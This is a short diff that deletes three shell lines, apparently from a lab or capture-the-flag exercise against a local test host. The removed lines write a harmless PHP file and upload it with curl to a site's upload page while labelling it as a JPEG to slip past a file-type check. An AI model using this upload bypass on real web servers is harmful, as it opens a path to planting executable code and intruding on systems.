@@ -1,3 +1,0 @@
-echo 'echo hello' > /tmp/index.php
-
-curl -X POST -F "uploaded=@/tmp/index.php;type=image/jpg" -F "Upload=Upload" "http://192.168.64.4/index.php?page=upload"
